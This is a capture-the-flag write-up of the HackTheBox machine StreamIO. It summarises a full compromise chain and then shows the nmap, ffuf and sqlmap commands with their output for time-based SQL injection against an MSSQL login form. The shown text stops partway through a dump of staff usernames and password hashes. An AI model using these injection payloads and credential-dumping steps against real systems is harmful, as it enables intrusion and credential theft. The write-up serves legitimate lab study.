# StreamIO Writeup

## Summary

This machine is labeled "medium," but it was much harder for me than [Talkative](../Talkative/README.md), which is a "hard" machine, because of a heavy amount of enumeration and a Windows privilege escalation technique I was not aware of previously.

Nmap shows two virtual hosts from an SSL certificate: `streamIO.htb` and `watch.streamIO.htb`. After a lot of directory bruteforcing, we find an admin directory (`https://streamio.htb/admin`), a php file that can only be used with `includes` (`https://streamio.htb/admin/master.php`), and a search page (`https://watch.streamio.htb/search.php`). [sqlmap](https://github.com/sqlmapproject/sqlmap) reveals that both the username field to login to `https://streamio.htb` and the search bar on the search page are vulnerable to "Microsoft SQL Server/Sybase stacked queries (comment)." This is a time-based injection. We slowly map out the databases and tables and then dump the `users` table over the course of more than 5 hours (time-based injection can only get about 1 character every 2-6 seconds). Using [CrackStation](https://crackstation.net/), we crack several passwords and find credentials that log us into `https://streamio.htb`.

Once signed in, we have access to the previous found `admin` page. We fuzz URL parameters and find a `debug` parameter. Then, we fuzz values for the `debug` parameter and discover it is vulnerable to LFI. We use PHP filter URIs to get the contents of `index.php` and the previously fuzzed `master.php`. This gives us the password for the `db_admin` user, which we will use later. Setting the `debug` GET parameter of `index.php` to `master.php` means we can load functionality in `master.php`, which just so happens to get the file contents of the POST parameter `include` and pass it to `eval`. Therefore, we get a Meterpreter reverse shell by loading a file via HTTP from our machine that downloads and runs a Metasploit reverse shell payload via a call to PHP's `system` function.

Once on the box, we use [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and realize that MS SQL is running on port `1433`. We forward that port to our attacker machine using the Meterpreter's `portfwd` function. Then, we use [impacket](https://github.com/SecureAuthCorp/impacket)'s [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) to connect to the database using the previously found credentials and we dump the tables we were unable to dump before. This gives us a crackable hash of `nikk37`'s password. Then, we use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to authenticate as `nikk37`.

Once we've moved laterally to the `nikk37` user, we run [WinPEAS]((https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)) again and find a Firefox credential database. We extract the credentials using [firepwd](https://github.com/lclevy/firepwd). Then, we use [crackmapexec](https://wiki.porchetta.industries/smb-protocol/authentication/checking-credentials-domain) to check if any credentials we have are valid. We have valid credentials for the `JDgodd` user.

We cannot connect remotely as `JDgodd`. So, we scan the machine using [SharpHound](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html) and [BloodHound](https://github.com/BloodHoundAD/BloodHound). We learn that the `JDgodd` user has `WriteOwner` permissions on the `CORE_STAFF` group, and that group has the ability to read the LAPS password. So, from `nikk37`'s shell we use `JDgodd`'s credentials to 1) make `JDgodd` the owner of `CORE_STAFF`, 2) give `JDgodd` all permissions on `CORE_STAFF` (since he is the owner), and 3) make `JDgodd` a member of `CORE_STAFF`. Finally, we simply read the LAPS password with `JDgodd`'s credentials and using evil-winrm to authenticate as the Administrator.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.158`.

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-29 08:59:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
|_ssl-date: 2022-07-29T09:01:27+00:00; +6h59m52s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
50127/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-07-29T09:00:51
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m52s, deviation: 0s, median: 6h59m51s
```

Let's add the `streamIO.htb` and `watch.streamIO.htb` domains (found in the SSL cert from `nmap`) to `/etc/hosts`: `echo "10.10.11.158 streamIO.htb\n10.10.11.158 watch.streamIO.htb" | sudo tee -a /etc/hosts`.

### Virtual Host Scanning

Now that we know the domain name, we can scan for other virtual hosts. Let's scan for subdomains with `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://streamio.htb/ -H "Host: FUZZ.streamio.htb" -fs 703`:

```
watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 95ms]
:: Progress: [114441/114441] :: Job [1/1] :: 170 req/sec :: Duration: [0:12:58] :: Errors: 0 ::
```

This only finds the other virtual host we already knew about.

### Directory bruteforcing

Bruteforcing for directories on `streamIO.htb` port `80` via `ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://streamio.htb/FUZZ` reveals nothing. Nothing is found on `http://watch.streamIO.htb` either.

Navigating to the pages themselves just shows a default Windows Server page. However, going to the `https` versions on port `443` shows valid webpages.

`https://streamIO.htb`:

![](screenshots/Screenshot%202022-07-28%20at%2022-12-43%20Streamio.png)

`https://watch.streamIO.htb`:

![](screenshots/Screenshot%202022-07-28%20at%2022-13-03%20Streamio.png)

Let's scan the `https` versions for directories.

```
$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://streamio.htb/FUZZ
Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 52ms]
admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 54ms]
css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 71ms]
js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 57ms]
fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 53ms]
IMAGES                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 52ms]
Fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 54ms]
Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 51ms]
CSS                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 51ms]
JS                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 57ms]
                        [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 59ms]
:: Progress: [87664/87664] :: Job [1/1] :: 703 req/sec :: Duration: [0:02:42] :: Errors: 0 ::

$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://watch.streamio.htb/FUZZ
static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 57ms]
Static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 54ms]
                        [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 57ms]
:: Progress: [87664/87664] :: Job [1/1] :: 717 req/sec :: Duration: [0:02:48] :: Errors: 0 ::
```

Interestingly, the found `/admin` directory on `streamio.htb` simply shows `FORBIDDEN` when loaded. No other important directories are found though.

We can also scan for `php` files since we have seen the `php` extension while browsing the site:

```
$ ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://watch.streamio.htb/FUZZ.php
index                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 60ms]
search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 130ms]
Search                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 73ms]
Index                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 54ms]
INDEX                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 54ms]
SEARCH                  [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 71ms]
blocked                 [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 55ms]
:: Progress: [87651/87651] :: Job [1/1] :: 725 req/sec :: Duration: [0:02:09] :: Errors: 0 ::

$ ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://streamio.htb/FUZZ.php
about                   [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 93ms]
contact                 [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 90ms]
login                   [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 106ms]
index                   [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 95ms]
register                [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 57ms]
About                   [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 59ms]
Contact                 [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 61ms]
Index                   [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 60ms]
Login                   [Status: 200, Size: 4145, Words: 796, Lines: 111, Duration: 57ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 55ms]
Register                [Status: 200, Size: 4500, Words: 905, Lines: 121, Duration: 61ms]
INDEX                   [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 60ms]
Logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
CONTACT                 [Status: 200, Size: 6434, Words: 2010, Lines: 206, Duration: 58ms]
ABOUT                   [Status: 200, Size: 7825, Words: 2228, Lines: 231, Duration: 117ms]
:: Progress: [87651/87651] :: Job [1/1] :: 722 req/sec :: Duration: [0:02:09] :: Errors: 0 ::
```

The `https://watch.streamio.htb/search.php` page is interesting:

![](screenshots/Screenshot%202022-07-28%20at%2022-35-30%20Streamio.png)

Let's look back at that `/admin` directory. The fact that a directory says "FORBIDDEN" instead of the usual 404 page is strange, so let's fuzz for files in the `/admin` directory by running `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u https://streamio.htb/admin/FUZZ.php`:

```
index                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 56ms]
Index                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 56ms]
master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 56ms]
INDEX                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 58ms]
Master                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 60ms]
MASTER                  [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 57ms]
:: Progress: [87651/87651] :: Job [1/1] :: 735 req/sec :: Duration: [0:02:06] :: Errors: 0 ::
```

The `https://streamio.htb/admin/master.php` page is new:

![](screenshots/Screenshot%202022-07-28%20at%2023-47-36%20https%20streamio%20htb.png)

### SQL Injection

On `https://streamio.htb` we can register, so let's do that and create an account:

![](screenshots/Screenshot%202022-07-28%20at%2022-20-51%20Streamio%20-%20Register.png)

Clicking the login link at the bottom of the sign up page causes a redirect to `https://streamio.htb/user-login.html`, which 404s. Going to the login page on the home page (`https://streamio.htb/login.php`) works and we attempt to sign in, but we are told "Login failed." So, there is probably some issue with the login logic. Let's see if it is vulnerable to SQL injection with [sqlmap](https://github.com/sqlmapproject/sqlmap) ([very helpful documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage), [HackTricks page](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)).

Run `sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent`:

```
[22:55:50] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.02' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[22:55:50] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=td5scf51tu8...7prl49rala'). Do you want to use those [Y/n] y
[22:55:53] [INFO] testing if the target URL content is stable
[22:55:53] [INFO] target URL content is stable
[22:55:53] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[22:55:54] [INFO] testing for SQL injection on POST parameter 'username'
[22:55:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:55:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:55:56] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:55:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:55:58] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:56:00] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:56:01] [INFO] testing 'Generic inline queries'
[22:56:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:56:02] [WARNING] time-based comparison requires larger statistical model, please wait. (done)
[22:56:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:56:14] [INFO] POST parameter 'username' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] y
[22:56:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:56:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:57:05] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 65 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=a';WAITFOR DELAY '0:0:5'--&password=a
---
[22:57:27] [INFO] testing Microsoft SQL Server
[22:57:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
y
[23:07:14] [INFO] confirming Microsoft SQL Server
[23:07:14] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[23:07:14] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
[23:07:20] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 10 or 2019
web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[23:07:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/streamio.htb'
```

So, the `username` parameter is injectable. Let's list the tables in each database by running `sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent --tables`:

```
[23:10:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[23:10:35] [INFO] resuming back-end DBMS 'microsoft sql server'
[23:10:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=78oltq18qn0...7lqrlic51f'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=a';WAITFOR DELAY '0:0:5'--&password=a
---
[23:10:37] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 2019 or 10
web application technology: PHP, Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[23:10:37] [INFO] fetching database names
[23:10:37] [INFO] fetching number of databases
[23:10:37] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[23:10:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[23:11:06] [INFO] adjusting time delay to 2 seconds due to good response times
6
[23:11:07] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[23:11:24] [INFO] adjusting time delay to 1 second due to good response times
model
[23:11:49] [INFO] retrieved: msdb
[23:12:11] [INFO] retrieved: STREAMIO
[23:12:54] [INFO] retrieved:
[23:13:00] [ERROR] invalid character detected. retrying..
[23:13:00] [WARNING] increasing time delay to 2 seconds
streamio_b
[23:14:34] [ERROR] invalid character detected. retrying..
[23:14:34] [WARNING] increasing time delay to 3 seconds
ackup
[23:15:28] [INFO] retrieved: tempdb
[23:16:43] [INFO] retrieved:
[23:16:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[23:16:43] [INFO] fetching tables for databases: STREAMIO, model, msdb, streamio_backup, tempdb
[23:16:43] [INFO] fetching number of tables for database 'STREAMIO'
[23:16:43] [INFO] retrieved: 2
[23:16:52] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
dbo.movies
[23:19:09] [INFO] retrieved: dbo.users
[23:20:21] [INFO] fetching number of tables for database 'streamio_backup'
[23:20:21] [INFO] retrieved:
[23:20:22] [INFO] retrieved: 0
[23:20:31] [INFO] fetching number of tables for database 'msdb'
[23:20:31] [INFO] retrieved: 23
[23:20:50] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
dbo.autoadmin_backup_confi^C
```

I kill the command after many minutes because this is a time-based exploit so each character takes about 2-3 seconds to come through.

Note that we cannot access the `streamio_backup` database. Trying to run `sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent -D streamio_backup --tables --batch` errors out with `[CRITICAL] unable to retrieve the tables for any database`.

Importantly, the `STREAMIO` database has two tables: `movies` and `users`. Let's try to get some user credentials. First, let's retrieve the columns using `sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent -D STREAMIO -T users --columns`:

```
[23:29:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB7.0 (.NET CLR 3.0.30618)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[23:29:05] [INFO] resuming back-end DBMS 'microsoft sql server'
[23:29:05] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=265sug9q54k...nt0lfv9a71'). Do you want to use those [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=a';WAITFOR DELAY '0:0:5'--&password=a
---
[23:29:07] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 2016 or 10
web application technology: Microsoft IIS 10.0, PHP 7.2.26, PHP
back-end DBMS: Microsoft SQL Server 2019
[23:29:07] [INFO] fetching columns for table 'users' in database 'STREAMIO'
[23:29:07] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[23:29:36] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
4
[23:29:38] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[23:29:58] [INFO] adjusting time delay to 2 seconds due to good response times
id
[23:30:11] [INFO] retrieved: int
[23:30:42] [INFO] retrieved: is_staff
[23:31:59] [INFO] retrieved: bit
[23:32:29] [INFO] retrieved: pas
[23:33:06] [ERROR] invalid character detected. retrying..
[23:33:06] [WARNING] increasing time delay to 3 seconds
sword
[23:34:10] [INFO] retrieved: nchar
[23:35:08] [INFO] retrieved: user
[23:36:04] [ERROR] invalid character detected. retrying..
[23:36:04] [WARNING] increasing time delay to 4 seconds
[23:36:24] [ERROR] invalid character detected. retrying..
[23:36:24] [WARNING] increasing time delay to 5 seconds
name
[23:37:25] [INFO] retrieved: nchar
Database: STREAMIO
Table: users
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| id       | int     |
| is_staff | bit\x02 |
| password | nchar   |
| username | nchar   |
+----------+---------+

[23:38:52] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/streamio.htb'
```

Now, we can grab a user from the `users` table in the `STREAMIO` database. Since `is_staff` is a bit, let's get all the user's usernames and passwords where `is_staff=1` by running `sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent -D STREAMIO -T users -C id,is_staff,password,username --where "is_staff=1" --dump`. This command just continuously outputs `[23:49:35] [INFO] retrieved:` without any data. However, `sqlmap` suggested the following:

```
[23:49:26] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
```

Sure enough, rerunning with `--force-pivoting` seems to fix the problem:

```
$ sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent -D STREAMIO -T users -C id,is_staff,password,username --where "is_staff=1" --dump --force-pivoting
[23:50:32] [INFO] fetching number of column(s) 'id,is_staff,password,username' entries for table 'users' in database 'STREAMIO'
[23:50:32] [INFO] resumed: 29
[23:50:32] [INFO] fetching number of distinct values for column 'id'
[23:50:32] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[23:50:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[23:51:01] [INFO] adjusting time delay to 2 seconds due to good response times
9
[23:51:07] [INFO] using column 'id' as a pivot for retrieving row data
[23:51:07] [INFO] retrieved: 10
[23:51:19] [INFO] retrieved: 1
[23:51:27] [INFO] retrieved: 3577c47eb1e12c8ba021611e1280753c
[00:00:16] [INFO] retrieved: Tha
[00:00:54] [ERROR] invalid character detected. retrying..
[00:00:54] [WARNING] increasing time delay to 3 seconds
ne
[00:17:18] [INFO] retrieved: 11
[00:17:35] [INFO] retrieved: 1
[00:17:44] [INFO] retrieved: 35394484d89fcfdb3c5e447fe749d213
[00:30:54] [INFO] retrieved: C^C
[00:31:04] [WARNING] user aborted during enumeration. sqlmap will display partial output
Database: STREAMIO
Table: users
[1 entry]
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
| 10 | 1        | 3577c47eb1e12c8ba021611e1280753c                   | Thane                                              |
+----+----------+----------------------------------------------------+----------------------------------------------------+
```

This attack takes a long time. We can crack `Thane`'s password hash using [CrackStation](https://crackstation.net/), but signing in as this user doesn't work. There are multiple users so we could try them all, but the SQL injection is going to take a long time. Since it will take a long time we run with `--level 5 --risk 3` to scan for potential other methods:

```
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=a';WAITFOR DELAY '0:0:5'--&password=a

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: username=a' WAITFOR DELAY '0:0:5'-- tzgk&password=a
---
```

However, we only get time-based methods so that's unfortunate. Additionally, the search parameter on `https://watch.streamio.htb/search.php` is also injectable, but it too is a time-based injection:

```
---
Parameter: q (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=a%' AND 1154=1154 AND 'rteQ%'='rteQ
---
```

We will use [this StackOverflow answer](https://unix.stackexchange.com/a/82610) to automatically run the command again if it fails:

```
$ for i in 1 2 3 4 5; do sqlmap -u https://streamio.htb/login.php --data username=a\&password=a -p username --random-agent -D STREAMIO -T users -C id,username,password --where "is_staff=1" --dump --force-pivoting --batch --pivot-column id && break || sleep 15; done
[02:04:52] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; hu; rv:1.8.1.14) Gecko/20080416 Fedora/2.0.0.14-1.fc7 Firefox/2.0.0.14' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[02:04:53] [INFO] resuming back-end DBMS 'microsoft sql server'
[02:04:53] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=pspmg1umdmo...j1q4ij1spi'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=a';WAITFOR DELAY '0:0:5'--&password=a
---
[02:04:53] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 10 or 2019
web application technology: PHP 7.2.26, Microsoft IIS 10.0, PHP
back-end DBMS: Microsoft SQL Server 2019
[02:04:53] [INFO] fetching entries of column(s) 'id,password,username' for table 'users' in database 'STREAMIO'
[02:04:53] [INFO] fetching number of column(s) 'id,password,username' entries for table 'users' in database 'STREAMIO'
[02:04:53] [INFO] resumed: 29
[02:04:53] [INFO] using column 'id' as a pivot for retrieving row data
[02:04:53] [INFO] resumed: 10
[02:04:53] [INFO] resuming partial value: 3
[02:04:53] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[02:04:58] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[02:05:14] [INFO] adjusting time delay to 1 second due to good response times
577c47eb1e12c8ba021611e1280753c
[02:09:51] [INFO] retrieved: Thane
[02:16:09] [INFO] retrieved: 11
[02:16:17] [INFO] retrieved: 35394484d89fcfdb3c5e447fe749d213
[02:21:24] [INFO] retrieved: Carmon
[02:27:39] [INFO] retrieved: 12
[02:27:47] [INFO] retrieved: 54c88b2dbd7b1a84012fabc1a4c73415
[02:32:35] [INFO] retrieved: Barry
[02:38:50] [INFO] retrieved: 13
[02:38:59] [INFO] retrieved: fd78db29173a5cf701bd69027cb9bf6b
[02:43:53] [INFO] retrieved: Oliver
[02:50:13] [INFO] retrieved: 14
[02:50:23] [INFO] retrieved: b83439b16f844bd6ffe35c02fe21b3c0
[02:55:35] [INFO] retrieved: Michelle
[03:01:45] [INFO] retrieved: 15
[03:01:52] [INFO] retrieved: 0cfaaaafb559f081df2befbe66686de0
[03:06:48] [INFO] retrieved: Gloria
[03:13:03] [INFO] retrieved: 16
[03:13:11] [INFO] retrieved: b22abb47a02b52d5dfa27fb0b534f693
[03:18:20] [INFO] retrieved: Victoria
[03:24:28] [INFO] retrieved: 17
[03:24:36] [INFO] retrieved: 1c2b3d8270321140e5153f6637d3ee53
[03:29:29] [INFO] retrieved: Alexendra
[03:35:34] [INFO] retrieved: 18
[03:35:44] [INFO] retrieved: 22ee218331afd081b0dcd8115284bae3
[03:40:40] [INFO] retrieved: Baxter
[03:46:56] [INFO] retrieved: 19
[03:47:07] [INFO] retrieved: ef8f3d30a856cf166fb8215aca93e9ff
[03:52:08] [INFO] retrieved: Clara
[03:58:25] [INFO] retrieved: 20
[03:58:32] [INFO] retrieved: 3961548825e3e21df5646cafe11c6c76
[04:03:26] [INFO] retrieved: Barbra
[04:09:38] [INFO] retrieved: 21
[04:09:46] [INFO] retrieved: ee0b8a0937abd60c2882eacb2f8dc49f
[04:14:58] [INFO] retrieved: Lenord
[04:21:17] [INFO] retrieved: 22
[04:21:25] [INFO] retrieved: 0049ac57646627b8d7aeaccf8b6a936f
[04:26:29] [INFO] retrieved: Austin
[04:32:55] [INFO] retrieved: 23
[04:33:05] [INFO] retrieved: 8097cedd612cc37c29
[04:34:37] [ERROR] invalid character detected. retrying..
[04:34:37] [WARNING] increasing time delay to 2 seconds
db152b6e9edbd3
[04:40:37] [INFO] retrieved: Garfield
[04:51:20] [INFO] retrieved: 24
[04:51:38] [INFO] retrieved: 6dcd87740abb64edf
[04:54:01] [INFO] adjusting time delay to 1 second due to good response times
a36d170f0d5450d
[04:57:34] [INFO] retrieved: Juliette
[05:03:43] [INFO] retrieved: 25
[05:03:52] [INFO] retrieved: bf55e15b119860a6e6b5a164377da719
[05:08:48] [INFO] retrieved: Victor
[05:15:07] [INFO] retrieved: 26
[05:15:16] [INFO] retrieved: 7df45a9e3de3863807c026ba48e55fb3
[05:20:25] [INFO] retrieved: Lucifer
[05:26:37] [INFO] retrieved: 27
[05:26:46] [INFO] retrieved: 2a4e2cf22dd8fcb45adcb91be1e22ae8
[05:31:40] [INFO] retrieved: Bruno
[05:38:02] [INFO] retrieved: 28
[05:38:13] [INFO] retrieved: ec33265e5fc8c2f1b0c137bb7b3632b5
[05:43:08] [INFO] retrieved: Diablo
[05:49:24] [INFO] retrieved: 29
[05:49:36] [INFO] retrieved: dc332fb5576e9631c9dae83f194f8e70
